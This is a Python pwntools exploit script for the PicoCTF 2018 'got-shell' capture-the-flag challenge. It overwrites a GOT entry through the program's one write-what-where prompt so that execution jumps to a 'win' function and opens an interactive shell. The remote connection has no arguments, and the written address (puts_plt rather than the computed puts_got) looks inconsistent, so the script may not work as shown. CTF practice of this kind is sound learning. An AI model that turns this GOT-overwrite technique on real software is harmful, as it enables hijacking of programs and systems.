#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./PicoCTF_2018_got-shell')
	elf = ELF('./PicoCTF_2018_got-shell',checksec=False)

else:
	p = remote()
	elf = ELF('./PicoCTF_2018_got-shell',checksec=False)


win = elf.symbols['win']
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
sprintf_got = elf.got['sprintf']
success(hex(puts_got))
sla("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\n",p32(puts_plt))
sla("Okay, now what value would you like to write to 0x",p32(win))

ia()